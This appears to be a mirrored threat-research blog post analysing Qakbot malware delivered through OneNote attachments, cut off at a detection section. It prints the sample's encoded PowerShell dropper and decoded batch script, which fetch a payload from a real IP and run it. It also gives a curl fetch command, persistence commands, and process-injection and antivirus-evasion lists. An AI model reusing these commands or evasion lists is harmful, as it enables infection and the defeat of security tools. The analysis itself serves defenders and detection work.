@@ -1,0 +1,1995 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Duy Phuc  Pham | Qakbot Evolves to OneNote Malware Distribution</title>
+<meta name="description" content="Dr. Pham Duy Phuc webpage
+">
+
+<!-- Open Graph -->
+
+
+<!-- Bootstrap & MDB -->
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" integrity="sha512-MoRNloxbStBcD8z3M/2BmnT+rg4IsMxPkXaGh2zD6LGNNFE80W3onsAhRcMAMrSoyWL9xD7Ert0men7vR8LUZg==" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/css/mdb.min.css" integrity="sha512-RO38pBRxYH3SoOprtPTD86JFOclM51/XTIdEPh5j8sj4tp8jmQIx26twG52UaLi//hQldfrh7e51WzP9wuP32Q==" crossorigin="anonymous" />
+
+<!-- Fonts & Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css"  integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.0/css/academicons.min.css" integrity="sha512-W4yqoT1+8NLkinBLBZko+dFB2ZbHsYLDdr50VElllRcNt2Q4/GSs6u71UHKxB7S6JEMCp5Ve4xjh3eGQl/HRvg==" crossorigin="anonymous">
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons">
+
+<!-- Code Syntax Highlighting -->
+<link rel="stylesheet" href="https://gitcdn.link/repo/jwarby/jekyll-pygments-themes/master/github.css" />
+
+<!-- Styles -->
+<link rel="shortcut icon" href="/assets/img/favicon.ico">
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<link rel="canonical" href="/arch/7_arch/">
+
+<!-- Theming-->
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-25Z3QPHEXC"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-25Z3QPHEXC');
+  </script>
+
+
+    
+<!-- MathJax -->
+<script type="text/javascript">
+  window.MathJax = {
+    tex: {
+      tags: 'ams'
+    }
+  };
+</script>
+<script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js"></script>
+<script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+
+  </head>
+
+  <body class="fixed-top-nav ">
+
+    <!-- Header -->
+
+    <header>
+
+    <!-- Nav Bar -->
+    <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top">
+    <div class="container">
+      
+      <a class="navbar-brand title font-weight-lighter" href="https://phuc.fr/">
+       <span class="font-weight-bold">Duy Phuc</span>   Pham
+      </a>
+      
+      <!-- Navbar Toogle -->
+      <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar top-bar"></span>
+        <span class="icon-bar middle-bar"></span>
+        <span class="icon-bar bottom-bar"></span>
+      </button>
+      <div class="collapse navbar-collapse text-right" id="navbarNav">
+        <ul class="navbar-nav ml-auto flex-nowrap">
+          <!-- About -->
+          <li class="nav-item ">
+            <a class="nav-link" href="/">
+              about
+              
+            </a>
+          </li>
+          
+          <!-- Other pages -->
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/projects/">
+                projects
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/publications/">
+                publications
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/talks/">
+                talks
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/teaching/">
+                teaching
+                
+              </a>
+          </li>
+          
+          
+          
+          <li class="nav-item ">
+              <a class="nav-link" href="/arch/">
+                virus-archives
+                
+              </a>
+          </li>
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+</header>
+
+
+    <!-- Content -->
+
+    <div class="container mt-5">
+      <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Qakbot Evolves to OneNote Malware Distribution</h1>
+    <p class="post-description">March 07, 2023 </p>
+  </header>
+
+  <article>
+    <p>By <a href="https://www.trellix.com/en-us/about/newsroom/stories/contributors/pham-duy-phuc.html">[Pham Duy
+Phuc]</a>, <a href="https://www.trellix.com/en-us/about/newsroom/stories/contributors/raghav-kapoor.html">[Raghav
+Kapoor]</a>, <a href="https://www.trellix.com/en-us/about/newsroom/stories/contributors/john-fokker.html">[John
+Fokker
+J.E.]</a>, <a href="https://www.trellix.com/en-us/about/newsroom/stories/contributors/alejandro-houspanossian.html">[Alejandro
+Houspanossian]</a> and <a href="https://www.trellix.com/en-us/about/newsroom/stories/contributors/mathanraj-tk.html">[Mathanraj
+Thangaraju]</a> ·
+March 07, 2023 </p>
+
+<p><em>Qakbot</em> (aka QBot, QuakBot, and Pinkslipbot) is a sophisticated piece
+of malware that has been active since at least 2007. Since the end of
+January 2023, there has been an upsurge in the number of Qakbot
+campaigns using a novel delivery technique: OneNote documents for
+malware distribution. Moreover, the Trellix Advanced Research Center has
+detected various campaigns that used OneNote documents to distribute
+other malware such as AsyncRAT, Icedid, XWorm etc.</p>
+
+<p>Brief history of Qakbot</p>
+
+<p>Qakbot banking trojan is a sophisticated and dangerous piece of malware
+that has been active since at least 2007. Qakbot has worm-like
+capabilities that allow it to propagate an infected network
+autonomously. It is primarily used to steal sensitive information from
+infected systems, such as login credentials and financial information,
+and can also be used to download and execute additional malware on the
+victim system. New functionalities have been added to include C2
+communication to acquire additional malware modules and perform data
+exfiltration. Qakbot also contains multiple evasion techniques and
+sandbox detection.</p>
+
+<p>The malware is primarily spread through phishing emails and malicious
+attachments, although Qakbot has also been observed as a secondary
+payload, dropped by other botnets such as Emotet. Qakbot has been used
+to drop ransomware such as Prolock, Egregor and DoppelPaymer. It also
+used to be associated with TA570 which often uses the malware as an
+initial entry point in their campaigns. </p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image1.jpeg" alt="Figure 1 Qakbot infection rate for the last 3
+months" />{width=”6.5in”
+height=”1.7763888888888888in”}Figure 1 Qakbot infection rate for the
+last 3 months</p>
+
+<p>This timeline (Figure 1) shows the global Qakbot infection rate for the
+last 3 months, highlighting the continued threat of this dangerous
+malware distribution. Despite efforts to combat the virus over a decade,
+Qakbot remains a significant risk to individuals and organizations
+worldwide as shown in Figure 2, which illustrates a global heatmap of
+Qakbot detections. Several outbreaks of Qakbot infections have been
+detected in numerous countries. We have seen a considerable number of
+infections in the United States, India, Turkey, and Thailand, despite
+the fact that these campaigns do not seem to target a specific industry
+or country. The sector with the highest number of infected IoCs was
+Banking, Financial, Wealth Management, followed by Government, and
+Outsourcing.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image2.jpeg" alt="Figure 2 Global heatmap of Qakbot detection over the last 3
+months" />{width=”6.5in”
+height=”4.582638888888889in”}Figure 2 Global heatmap of Qakbot detection
+over the last 3 months</p>
+
+<p>Over the years, Qakbot has evolved with significant changes in terms of
+infection vectors. Email has been the preferred initial attack vector
+for threat actors. Recently, hijacked email threats have become popular
+for injecting their malicious email. A report
+from <a href="https://news.sophos.com/en-us/2023/02/06/qakbot-onenote-attacks/">[Sophos]</a> indicated
+that malicious actors were starting to distribute spearphishing emails
+with malicious Microsoft OneNote documents to infect users with variants
+from the Qakbot malware family. </p>
+
+<p>Our research presents an analysis of a new spreading vector of the
+Qakbot malware (Figure 3). Specifically, an analysis of malicious
+OneNote documents that led to a Qakbot loader DLL and its unpacked form.
+We will show how we deobfuscate, unpack malicious parts and extract
+their configurations. Based on our investigation, we believe that the
+tactic of leveraging OneNote documents to distribute other malware
+variants will continue to raise.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image3.jpeg" alt="Figure 3 Threat vectors of malicious OneNote
+campaigns" />{width=”6.5in”
+height=”5.489583333333333in”}Figure 3 Threat vectors of malicious
+OneNote campaigns</p>
+
+<p>Initial infection vector</p>
+
+<p>Email has been the initial attack vector for the malware families
+abusing OneNote documents as the infection vector. Attackers have been
+alternating between two attack vectors in different waves to achieve
+their goals: </p>
+
+<ul>
+  <li>
+    <p><strong>URL embedded in email downloads the malicious file:</strong> URL based
+attacks were coupled with IP address and User-Agent evasion which
+would only serve the malicious file if the User-Agent string comes
+from a Microsoft Windows computer. User-Agents from browsers on
+Mac/iOS, Linux, and Android are ignored. In addition, they employed
+schemeless URLs to avoid detection, as some analysis engines are not
+capable of identifying and extracting these patterns.</p>
+  </li>
+  <li>
+    <p><strong>Malicious file as email attachment (Figure 4):</strong> Attackers have
+used different attachment types to deliver the payload. Over the
+time, they have used ZIP files, HTML files, PDF files, and now
+OneNote files. They coupled it with password protection to evade
+analysis where the password was either mentioned in the email or the
+file would be hosted on legit services with password mentioned on
+the download page.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image4.jpeg" alt="Figure 4 Phishing email with OneNote document as
+attachments" />{width=”6.5in”
+height=”4.299305555555556in”}Figure 4 Phishing email with OneNote
+document as attachment</p>
+
+<p>We have seen different variations of OneNote document being used in
+these campaigns:</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image5.jpeg" alt="Figure 5 Screenshot of Office365 themed phishing OneNote
+document." />Figure
+5 Screenshot of Office365 themed phishing OneNote document.</p>
+
+<p><em>Figure 5</em> illustrates a themed phishing attack that has also been
+spotted in PDF attachments that lure victims to download a ZIP file
+containing the malware Qakbot. The specific tactics and indicators of
+compromise can be found in the <em>Appendix</em>. <img src="/assets/img/arch/Qakbot.assets/image6.jpeg" alt="Figure 6 Screenshot of the
+execution of phishing OneNote document: Variation
+2" /></p>
+
+<p>Figure 6 Screenshot of the execution of phishing OneNote document:
+Variation 2</p>
+
+<p>A Call-to-Action button (CTA) is present in all the OneNote documents
+which requires Click Action to execute the embedded payload. If the
+victim believes the fake message and clicks on CTA button, the embedded
+attachment will be opened with a warning message box. Once the victim
+clicks on "OK", there is no warning message anymore, and it will
+download and execute the remote payload.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image7.jpeg" alt="Figure 7 Warning window of opening attachments in
+OneNote." />{width=”5.209027777777778in”
+height=”2.566666666666667in”}Figure 7 Warning window of opening
+attachments in OneNote.</p>
+
+<p>First-stage malware analysis: Microsoft OneNote document</p>
+
+<p>Introduction to OneNote threat vector</p>
+
+<p>Microsoft OneNote is a note-taking collaboration tool that allows users
+to capture and organize their thoughts, ideas, and notes. It is
+installed by default from the Microsoft Office suite, and is available
+on a wide range of platforms, including Windows, macOS, Android, and
+iOS. OneNote documents are often overlooked when performing malware
+detection. Even though OneNote cannot execute VBA macros, it has
+significant potential for phishing as an initial vector. OneNote has the
+following advantages:</p>
+
+<ul>
+  <li>
+    <p>Offers a formatting capability that can lure users into opening
+malicious files or links</p>
+  </li>
+  <li>
+    <p>Not impacted by Office Protected View or Mark of the Web protection</p>
+  </li>
+  <li>
+    <p>OneNote supports integration with other Microsoft Office
+applications, such as Outlook, Word, Excel, and PowerPoint which can
+be displayed without Protected View</p>
+  </li>
+  <li>
+    <p>Allows for the embedding of MSF, BAT, HTA, BAT, EXE files, and other
+executable extensions</p>
+  </li>
+  <li>
+    <p>Portability of code development through the OneNote XML objects
+makes it easier for threat actors to automatically generate a large
+volume of obfuscated variants</p>
+  </li>
+</ul>
+
+<p>In this research, we analyze a specific sample identified by the MD5
+hash 83feba178d0097929e6efeb27719d5db. It belongs to a Qakbot campaign
+which is primarily spread through spam email that include Office OneNote
+document attachments. The Trellix Advanced Research Center’s Threat
+Intelligence Group gathers and analyzes information from multiple open
+and closed sources before disseminating this report.</p>
+
+<p>First-stage OneNote sample information</p>
+
+<p>Filename</p>
+
+<p>Funds_834333.one</p>
+
+<p>MD5</p>
+
+<p>83feba178d0097929e6efeb27719d5db</p>
+
+<p>SHA-1</p>
+
+<p>e50f09e56a72b14ff200b94ca583c3f9bb1112b1</p>
+
+<p>SHA-256</p>
+
+<p>033ca3aa775a34a7a4b6533b0fb744c9c71ab6cebec7e3f17a261e8f4edcdd01</p>
+
+<p>File size</p>
+
+<p>171 KB</p>
+
+<p>To parse its information, a few free tools can help in analyzing OneNote
+documents such
+as [OneNoteAnalyzer], <a href="https://github.com/volexity/threat-intel/tree/main/tools/one-extract">[One-Extract]</a>, <a href="https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/">[Onedump.py]</a>.
+This specific OneNote sample contains CMD (Windows Command File), which
+indicates that it may include executable code. Below is the metadata
+that was extracted using OneNoteAnalyzer:</p>
+
+<p>From the extracted metadata, we notice that the attached CMD which was
+last saved under the path "Z:\build\one" on 2/6/2023 using Microsoft
+OneNote 2010. The CMD payload that contains the malicious payload is
+shown in the Code below:</p>
+
+<p>powershell.exe $aV2hgYDB = '5d44a2b0d85aa1a4dd3f218be6422c66';<br />
+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('DQpAZWNobyBvZmYNCnNldCBhTWVXMUU9YTgweU9zDQpzZXQgYVRacG9MPWFxRDE4R1kNCnNldCBhZmhIZUo9YUdzSzR5VWpmDQpwb3dlcnNoZWxsIChuZXctb2JqZWN0IHN5c3RlbS5uZXQud2ViY2xpZW50KS5kb3dubG9hZGZpbGUoJ2h0dHA6Ly8yMTYuMTIwLjIwMS4xMDAvNjA4NTIuZGF0JywgJ0M6XHByb2dyYW1kYXRhXGdiLmpwZycpOw0Kc2V0IGFqYXM0YkVGPWFmd1VwUQ0Kc2V0IGE4bFdJajQ9YXhUOHV2OXANCmNhbGwgcnUlMWxsMzIgQzpccHJvZ3JhbWRhdGFcZ2IuanBnLFdpbmQNCmV4aXQNCg=='))
+&gt; C:\Users\Public\1.cmd&amp;&amp;start /min C:\Users\Public\1.cmd nd </p>
+
+<p>This command launches PowerShell and sets a variable, $aV2hgYDB, to a
+specific value. It then decodes a base64-encoded string then executes
+the resulting command, which downloads and executes a file from a
+specific URL. The output of this command is redirected to a file named
+"1.cmd" located in the “Public” user folder, and the script then
+launches this file, running the command contained within it. We have the
+following decoded Base64 code:</p>
+
+<p><em>\@echo off<br />
+set aMeW1E=a80yOs<br />
+set aTZpoL=aqD18GY<br />
+set afhHeJ=aGsK4yUjf<br />
+powershell (new-object
+system.net.webclient).downloadfile('http://216.120.201.100/60852.dat',<br />
+'C:\programdata\gb.jpg');<br />
+set ajas4bEF=afwUpQ<br />
+set a8lWIj4=axT8uv9p<br />
+call ru%1ll32 C:\programdata\gb.jpg,Wind<br />
+exit</em></p>
+
+<p>This script begins by turning off command echoing. It then sets several
+variables to specific values. The script executes a PowerShell command
+to download a file from a specified URL and save it to
+'C:\programdata\gb.jpg'. The script executes a command to run
+"rundll32" command and the 'C:\programdata\gb.jpg' file as
+arguments along with <em>Wind</em> as module name. This will execute the file
+as a DLL. </p>
+
+<p>To download the remote payload, the malware uses <em>powershell (new-object
+system.net.webclient).downloadfile</em> which makes a request to remote host
+without User-Agent header. We observed in other OneNote campaigns which
+uses <em>cURL</em> (is a popular Linux tool but it has been part of Windows 10
+and later versions) and <em>PowerShell Invoke-WebRequest.</em>Since the malware
+is evolving over the time, one might want to fetch the remote payload
+manually to monitor by executing the following command: </p>
+
+<p><em>curl http://216.120.201.100/60852.dat -H 'User-Agent:'
+--output gb.jpg</em></p>
+
+<p>The following table is a list of recommended user-agents to reproduce
+according to downloading techniques used by malicious payloads:</p>
+
+<p>Technique</p>
+
+<p>Recommended User-Agent</p>
+
+<p><em>curl</em></p>
+
+<p>curl/7.86.0</p>
+
+<p><em>powerShell Invoke-WebRequest</em></p>
+
+<p>Mozilla/5.0 (Windows NT; Windows NT 10.0; de-DE)<br />
+WindowsPowerShell/5.1.17763.316</p>
+
+<p><em>powershell (new-object system.net.webclient).downloadfile</em></p>
+
+<p>No User-Agent</p>
+
+<p>Second-stage malware analysis: malicious Loader DLL</p>
+
+<p>Second-stage DLL static information of gb.jpg</p>
+
+<p>MD5</p>
+
+<p>891c7d5050fe852a032eeda9311498e8</p>
+
+<p>SHA-1</p>
+
+<p>52975754a7e3048c5b587e4926e99cb5c8123929</p>
+
+<p>SHA-256</p>
+
+<p>e16e0faae0e9851a782d026f6692e34a9c7bae14c545aa8ac1e1ef033dfd06a8</p>
+
+<p>File size</p>
+
+<p>307 KB</p>
+
+<p>Name</p>
+
+<p>libKF5ItemViews.dll</p>
+
+<p>Build date</p>
+
+<p>2010-08-17 14:54:22</p>
+
+<p>This DLL contains multiple sections, including 458 exports (Figure 8),
+which are functions that can be called by other programs. In this case,
+the malicious activity can only be executed via the export
+named <em>"Wind"</em> or its ordinary number <em>#458</em>, otherwise sandbox
+analysis will fail to monitor any malicious behaviors.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image8.jpeg" alt="Figure 8 DLL sections and exports" />{width=”6.5in”
+height=”1.2965277777777777in”}Figure 8 DLL sections and exports</p>
+
+<p>The entry point "Wind" in the DLL file is obfuscated using various
+evasion techniques, such as direct and conditional jumps (jmp, jz, jnz).
+It contains a shellcode that will be decrypted using XOR and then
+executed in memory. This shellcode further decrypts the main Qakbot DLL,
+frees itself from memory and executes the main Qakbot payload in the
+end.</p>
+
+<p>This particular sample leverages a variety of anti-debugging techniques
+through
+the <a href="https://anti-debug.checkpoint.com/techniques/debug-flags.html">[PEB]</a> ,
+so it is recommended that analysts utilize anti-evasion solutions when
+configuring the debugger environment (as depicted in the Figure 9).</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image9.jpeg" alt="Figure 9 Recommended setup for anti-debugging
+flags." />{width=”2.3319444444444444in”
+height=”1.5972222222222223in”}Figure 9 Recommended setup for
+anti-debugging flags.</p>
+
+<p>The Qakbot’s DLL that is dumped from memory has its sections misaligned,
+requiring analyst to correct the section addresses and size within the
+file header to their proper values (as shown in the Figure 10).</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image10.jpeg" alt="Figure 10 Correct header
+alignment." />{width=”5.44375in”
+height=”4.0in”}Figure 10 Correct header alignment.</p>
+
+<p>Third-stage malware analysis: Qakbot Core DLL</p>
+
+<p>There are already numerous detailed reports such as from our
+research <a href="https://www.trellix.com/en-us/about/newsroom/stories/research/demystifying-qbot-malware.html">[team]</a> or <a href="https://www.elastic.co/security-labs/qbot-malware-analysis">[others]</a> available
+about this [Qakbot]variant’s behavior and techniques, which
+provide in-depth analysis of its capabilities and modus <em>operandi</em>. Our
+focus is presenting the key findings related to this sample: String
+obfuscation, Persistence, Evasion techniques and C2 communication,
+rather than duplicating the information that is already readily
+available in the state of the art. </p>
+
+<p>String obfuscation</p>
+
+<p>Most of the significant string values in the malware binary have been
+encrypted therefore nothing will be returned from static analysis tools
+such as <em>strings</em>, however they can be decrypted using static
+extraction. The encrypted strings and keys are hardcoded in four
+separate locations that are loaded onto the stack or register, and then
+called to function at <em>0x100019D4</em> and <em>0x10009388</em> to decrypt them. The
+decryption function accepts one argument which is the index of requested
+string.</p>
+
+<p>; void *__cdecl sub_100019A6 (unsigned int index)<br />
+sub_100019A6 proc near<br />
+index= dword ptr 8<br />
+push ebp<br />
+mov ebp, esp<br />
+push [ebp+index]<br />
+mov edx, 57Dh<br />
+push ecx<br />
+push offset key_blob_1<br />
+mov ecx, offset enc_blob_1<br />
+call sub_1000A0A6<br />
+add esp, 0Ch<br />
+pop ebp<br />
+retn<br />
+sub_100019A6 endp</p>
+
+<p>Table 1. Decryption function that takes index input from stack</p>
+
+<p>sub_1000198C proc near<br />
+push ecx <br />
+push ecx <br />
+push offset key_blob_1<br />
+mov edx, 57Dh<br />
+mov ecx, offset enc_blob_1<br />
+call sub_1000A0CC<br />
+add esp, 0Ch <br />
+retn<br />
+sub_1000198C endp</p>
+
+<p>Table 2 Decryption function that takes index input from register</p>
+
+<p>By simply XOR between the two encrypted blobs and keys, we will
+accomplish the two decrypted continuous string blobs. Based on the
+decrypted strings and disassembled code, the following sections will
+present key features of this Qakbot variant.</p>
+
+<p>Persistence</p>
+
+<p>     "%s\system32\schtasks.exe" /Create /ST %02u:%02u /RU "NT
+AUTHORITY\SYSTEM" /SC ONCE /tr "%s" /Z /ET %02u:%02u /tn %s<br />
+     schtasks.exe /Create /RU "NT AUTHORITY\SYSTEM" /SC ONSTART /TN
+%u /TR "%s" /NP /F<br />
+     SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
+
+<p>The execution of the above commands demonstrates the persistence
+mechanism employed by the malware. The first line creates a scheduled
+task using the Windows built-in tool "schtasks.exe". The task is set
+to run only once at a specified time, as specified by the <em>"/ST
+%02u:%02u"</em> and <em>"/ET %02u:%02u"</em> parameters. The task is executed
+with the highest privileges using the "NT AUTHORITY<strong>∖</strong>SYSTEM" user,
+as specified by the <em>"/RU"</em> parameter. The task command, <em>"%s"</em>, is
+passed as an argument via the "/tr" parameter. The <em>"/Z"</em> parameter
+ensures that the task continues to run even if the user logs off. The
+task is given a name, specified by the <em>"/tn %s"</em> parameter.</p>
+
+<p>The second line is set to run at every system start, as specified by the
+"/SC ONSTART" parameter. The "/NP" parameter ensures that the task
+is not prompted for administrative privileges, while the "/F"
+parameter forces the task to be created, even if a task with the same
+name already exists.</p>
+
+<p>This sample either creates scheduled tasks or creates registry run key
+in <em>SOFTWARE\Microsoft\Windows\CurrentVersion\Run</em>. </p>
+
+<p>Process injection</p>
+
+<p>When the DLL payload is executed, it will inject its malicious code to a
+legitimate Windows OS process to perform defense evasion. Figure 11
+shows the code and how it creates a suspended process (the wermgr.exe)
+as the first step of the process hollowing technique.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image11.jpeg" alt="Figure 11 Dynamic analysis: process
+tree." />{width=”5.44375in”
+height=”0.7652777777777777in”}Figure 11 Dynamic analysis: process tree.</p>
+
+<p>Below is the list of processes that can be injected by the Qakbot core
+.DLL during its execution:</p>
+
+<p>%SystemRoot%\System32\wermgr.exe<br />
+%SystemRoot%\SysWOW64\OneDriveSetup.exe<br />
+%SystemRoot%\System32\xwizard.exe<br />
+%SystemRoot%\System32\msra.exe<br />
+%SystemRoot%\System32\dxdiag.exe<br />
+%SystemRoot%\SysWOW64\xwizard.exe<br />
+%SystemRoot%\System32\AtBroker.exe<br />
+%SystemRoot%\SysWOW64\mobsync.exe<br />
+%SystemRoot%\SysWOW64\wermgr.exe<br />
+%SystemRoot%\SysWOW64\AtBroker.exe<br />
+%SystemRoot%\explorer.exe<br />
+%SystemRoot%\System32\OneDriveSetup.exe<br />
+%SystemRoot%\SysWOW64\CertEnrollCtrl.exe<br />
+%SystemRoot%\SysWOW64\msra.exe<br />
+%SystemRoot%\SysWOW64\dxdiag.exe<br />
+%SystemRoot%\System32\CertEnrollCtrl.exe<br />
+%SystemRoot%\System32\mobsync.exe<br />
+%SystemRoot%\SysWOW64\explorer.exe</p>
+
+<p>Table 3 List of processes that can be injected by the Qakbot core.</p>
+
+<p>Evasion techniques</p>
+
+<p>Anti-debugging</p>
+
+<p>The code in Table 4 shows the code snippet that verifies if this sample
+is being debugged using the PEB Structure’s BeingDebugged. If it detects
+the flag, it will <em>XOR</em> the 2 decryption key tables with 0xB8 to destroy
+itself then exit its process</p>
+
+<p>int __thiscall sub_100026E5(void* this,int al){<br />
+unsigned int v3; // eax<br />
+unsigned int i; // ecx<br />
+if (sub_1000BDB3(this) == -1) {<br />
+while (1){<br />
+if (sub_1000F297() &gt; 0) {<br />
+sub_1000BEAC(63, 1);<br />
+return 0;<br />
+}<br />
+if <strong>(NtCurrentPeb() -&gt; BeingDebugged)</strong><br />
+break;<br />
+( * (void(__stdcall **)(int, int))(dword_10020D98
++ 200))(1000, 1);<br />
+}<br />
+v3 = 0;<br />
+for (i=0; i &lt;0x80; ++i)<br />
+key_blob_2[i] \^= 0xB8u; <br />
+do<br />
+key_blob_1[v3++] \^= 0xB8u;<br />
+while (v3 &gt; 0x80);<br />
+}<br />
+return 0;<br />
+} </p>
+
+<p>Table 4 Anti debugging using PEB Being Debugged</p>
+
+<p>Anti-dynamic analysis</p>
+
+<p>This malware checks whether there are running processes in a block list,
+including:</p>
+
+<p>frida-winjector-helper-32.exe</p>
+
+<p>idaq64.exe</p>
+
+<p>frida-winjector-helper-64.exe</p>
+
+<p>loaddll32.exe</p>
+
+<p>tcpdump.exe</p>
+
+<p>PETools.exe</p>
+
+<p>windump.exe</p>
+
+<p>ImportREC.exe</p>
+
+<p>ethereal.exe</p>
+
+<p>LordPE.exe</p>
+
+<p>wireshark.exe</p>
+
+<p>SysInspector.exe</p>
+
+<p>ettercap.exe</p>
+
+<p>proc_analyzer.exe</p>
+
+<p>rtsniff.exe</p>
+
+<p>sysAnalyzer.exe</p>
+
+<p>packetcapture.exe</p>
+
+<p>sniff_hit.exe</p>
+
+<p>capturenet.exe</p>
+
+<p>joeboxcontrol.exe</p>
+
+<p>qak_proxy</p>
+
+<p>joeboxserver.exe</p>
+
+<p>dumpcap.exe</p>
+
+<p>ResourceHacker.exe</p>
+
+<p>CFF Explorer.exe</p>
+
+<p>x64dbg.exe</p>
+
+<p>not_rundll32.exe</p>
+
+<p>Fiddler.exe</p>
+
+<p>ProcessHacker.exe</p>
+
+<p>sniff_hit.exe</p>
+
+<p>tcpview.exe</p>
+
+<p>procmon.exe</p>
+
+<p>filemon.exe</p>
+
+<p>sysAnalyzer.exe</p>
+
+<p>Anti AVs</p>
+
+<p>The malware payload checks for Windows Defender Emulation using WinAPI
+GetFileAttributes of “C:\INTERNAL\__empty”. It verifies a list of
+processes that are related to antivirus products such as Kaspersky,
+Sentinel, AVG, Dr. Web, Fortinet, TrendMicro, F-Secure, ByteFence
+Anti-Malware, BitDefender, Avast, Windows Defender, Comodo Internet
+Security, ESET, etc.</p>
+
+<p>AvastSvc.exe;aswEngSrv.exe;aswToolsSvc.exe;afwServ.exe;aswidsagent.exe;AvastUI.exe<br />
+CynetEPS.exe;CynetMS.exe;CynetConsole.exe<br />
+avp.exe;kavtray.exe<br />
+SentinelServiceHost.exe;SentinelStaticEngine.exe;SentinelAgent.exe;<br />
+SentinelStaticEngineScanner.exe;SentinelUI.exe<br />
+ccSvcHst.exe;NortonSecurity.exe;nsWscSvc.exe<br />
+coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe<br />
+vkise.exe;isesrv.exe;cmdagent.exe<br />
+MBAMService.exe;mbamgui.exe<br />
+avgcsrvx.exe;avgsvcx.exe;avgcsrva.exe<br />
+CSFalconService.exe;CSFalconContainer.exe<br />
+bdagent.exe;vsserv.exe;vsservppl.exe<br />
+xagtnotif.exe;AppUIMonitor.exe<br />
+egui.exe;ekrn.exe<br />
+SophosUI.exe;SAVAdminService.exe;SavService.exe<br />
+dwengine.exe;dwarkdaemon.exe;dwwatcher.exe </p>
+
+<p>C2 communication</p>
+
+<p>In the Qakbot encryption/decryption process, the core DLL has two
+resources - one for the encrypted Configuration and one for the
+encrypted C2 IPs list. To decrypt these resources, the SHA1 Hash is
+computed on a certain string that is particular to each Qakbot sample,
+and that hash is used as the key for the RC4 algorithm.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image12.jpeg" alt="Figure 12 Encrypted configuration values in the DLL
+resources." />{width=”6.5in”
+height=”0.45208333333333334in”}Figure 12 Encrypted configuration values
+in the DLL resources.</p>
+
+<p>The first decryption using the RC4 technique with a hard-coded key
+“bUdiuy81gYguty@4frdRdpfko(eKmudeuMncueaN” yields the following data:</p>
+
+<ul>
+  <li>
+    <p>From bytes 0 to 20: SHA1 Hash of second Key with encrypted
+configuration</p>
+  </li>
+  <li>
+    <p>From bytes 20 to 40: Second Key</p>
+  </li>
+  <li>
+    <p>From bytes 40: Encrypted Configuration</p>
+  </li>
+</ul>
+
+<p>The second key is then used as the input for the second RC4 decryption
+to retrieve the decrypted configuration. </p>
+
+<p>After decryption, we found that the campaign ID for this Qakbot is
+"tok01" and the timestamp is "1676453967 " which corresponds to
+February 15, 2023. All extracted C2 (IP:port) can be found in Appendix
+table 2. Most of these addresses belong to other infected systems that
+are used as a proxy to forward traffic to additional proxies or the
+actual <a href="https://securelist.com/qakbot-technical-analysis/103931/">[C2]</a>. </p>
+
+<p>Qakbot has been known to use a few modules during its infection chain,
+most notably:</p>
+
+<ul>
+  <li>
+    <p>System information collection: In addition to general system
+information such as OS version, username, computer name, domain,
+screen resolution, system time, system uptime and bot uptime, it
+also contains the results of the installed applications and WMI
+queries are collected.</p>
+  </li>
+  <li>
+    <p>Fetching remote plugins: Qakbot has at least few known different
+plugins: Password grabber, Cookie grabber, UPnP module, Hidden VNC,
+Email Collector, Hooking module, Proxy module, Web inject.</p>
+  </li>
+</ul>
+
+<p>Threat Detection Strategies</p>
+
+<p>This section is mainly targeted to security teams working on detection
+engineering and threat hunting. It consists of campaign’s key
+behaviours, detection opportunities, and mitigations.</p>
+
+<p>Key Behaviors (TTPs)</p>
+
+<p>This is a list of some of the threat behaviors that can be leveraged for
+detection.</p>
+
+<p>Tactical Goal</p>
+
